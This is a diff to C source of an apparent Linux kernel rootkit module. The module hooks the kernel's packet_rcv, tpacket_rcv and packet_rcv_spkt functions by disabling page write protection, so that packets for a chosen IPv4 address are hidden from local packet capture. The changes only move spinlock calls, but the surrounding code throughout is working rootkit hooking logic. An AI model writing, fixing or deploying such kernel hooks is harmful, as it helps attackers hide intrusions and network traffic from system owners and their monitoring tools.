@@ -60,8 +60,6 @@ is_packet_hidden (struct sk_buff *skb)
 void
 hook_packet_rcv (void)
 {
-	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
-
 	/* disable write protection */
 	disable_page_protection();
 
@@ -74,16 +72,12 @@ hook_packet_rcv (void)
 	
 	/* reenable write protection */
 	enable_page_protection();
-
-	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 }
 
 /* hooks 'tpacket_rcv' */
 void
 hook_tpacket_rcv (void)
 {
-	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
-
 	/* disable write protection */
 	disable_page_protection();
 
@@ -96,16 +90,12 @@ hook_tpacket_rcv (void)
 	
 	/* reenable write protection */
 	enable_page_protection();
-
-	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 }
 
 /* hooks 'packet_rcv_spkt' */
 void
 hook_packet_rcv_spkt (void)
 {
-	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
-
 	/* disable write protection */
 	disable_page_protection();
 
@@ -118,16 +108,12 @@ hook_packet_rcv_spkt (void)
 	
 	/* reenable write protection */
 	enable_page_protection();
-
-	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 }
 
 /* restores 'packet_rcv' */
 void
 unhook_packet_rcv (void)
 {
-	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
-	
 	/* disable write protection */
 	disable_page_protection();
 
@@ -136,16 +122,12 @@ unhook_packet_rcv (void)
 
 	/* reenable write protection */
 	enable_page_protection();
-
-	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 }
 
 /* restores 'tpacket_rcv' */
 void
 unhook_tpacket_rcv (void)
 {
-	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
-	
 	/* disable write protection */
 	disable_page_protection();
 
@@ -154,16 +136,12 @@ unhook_tpacket_rcv (void)
 
 	/* reenable write protection */
 	enable_page_protection();
-
-	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 }
 
 /* restores 'packet_rcv_spkt' */
 void
 unhook_packet_rcv_spkt (void)
 {
-	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
-	
 	/* disable write protection */
 	disable_page_protection();
 
@@ -172,8 +150,6 @@ unhook_packet_rcv_spkt (void)
 
 	/* reenable write protection */
 	enable_page_protection();
-
-	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 }
 
 /* our manipulated 'packet_rcv' */
@@ -181,6 +157,7 @@ int
 manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
+	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
 
 	/* check if we need to hide this packet */	
 	if(is_packet_hidden(skb))
@@ -194,7 +171,8 @@ manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct pack
 	ret = packet_rcv(skb,dev,pt,orig_dev);
 	hook_packet_rcv();
 	
-	/* return the correct value of the original function */	
+	/* return the correct value of the original function */
+	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 	return ret;	
 }
 
@@ -203,6 +181,7 @@ int
 manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
+	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
 	
 	if(is_packet_hidden(skb))
 	/* check if we need to hide this packet */	
@@ -216,7 +195,8 @@ manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct pac
 	ret = tpacket_rcv(skb,dev,pt,orig_dev);
 	hook_tpacket_rcv();
 	
-	/* return the correct value of the original function */	
+	/* return the correct value of the original function */
+	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 	return ret;	
 }
 
@@ -225,6 +205,7 @@ int
 manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
+	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 	
 	if(is_packet_hidden(skb))
 	/* check if we need to hide this packet */	
@@ -238,7 +219,8 @@ manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct
 	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
 	hook_packet_rcv_spkt();
 
-	/* return the correct value of the original function */	
+	/* return the correct value of the original function */
+	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 	return ret;	
 }
 
@@ -255,9 +237,17 @@ load_packet_hiding (char *ipv4_addr)
 	hidden_ip = *(unsigned int *)dst; 
 
 	/* do the initial hook of all three functions */
+	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
 	hook_packet_rcv();
+	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
+
+	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
 	hook_tpacket_rcv();
+	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
+	
+	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 	hook_packet_rcv_spkt();
+	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 
 	ROOTKIT_DEBUG("Done.\n");
 }
@@ -266,12 +256,20 @@ load_packet_hiding (char *ipv4_addr)
 void
 unload_packet_hiding (void)
 {
-        ROOTKIT_DEBUG("Unloading packet hiding... bye!\n");
+	ROOTKIT_DEBUG("Unloading packet hiding... bye!\n");
 
 	/* restore all three functions before unloading */
+	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
 	unhook_packet_rcv();
+	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
+
+	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
 	unhook_tpacket_rcv();
+	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
+	
+	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 	unhook_packet_rcv_spkt();
+	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 
 	ROOTKIT_DEBUG("Done.\n");
 }
